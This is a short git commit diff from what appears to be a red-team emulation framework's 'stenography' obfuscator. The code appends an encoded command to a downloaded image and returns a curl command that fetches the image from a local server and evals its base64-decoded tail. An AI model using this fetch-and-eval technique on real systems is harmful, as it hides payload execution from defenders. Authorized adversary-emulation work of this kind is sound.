8f45f464a51d0d56989aacdf2161131d7558ba38
privateducky <davidhunt@mitre.org>
2020-05-19 10:59:25 -0400

    applying stenography obfuscator to list of options

--- app/obfuscators/stenography.py
+++ app/obfuscators/stenography.py
@@ -24,4 +24,5 @@ class Obfuscation(BaseObfuscator):
         with open('data/payloads/meow-%s.jpg' % link.id, 'wb') as meow:
             meow.write(requests.get(data['file'], verify=False).content)
             meow.write(str.encode(link.command))
-        return 'curl -s -X POST -H "file:meow-%s.jpg" localhost:8888/file/download > meow-%s.jpg;eval $(tail -c %s meow-%s.jpg | base64 --decode)' % (link.id, link.id, len(link.command), link.id)
+        return 'curl -s -X POST -H "file:meow-%s.jpg" localhost:8888/file/download > meow-%s.jpg;eval $(tail -c %s meow-%s.jpg | base64 --decode)' \
+               % (link.id, link.id, len(link.command), link.id)
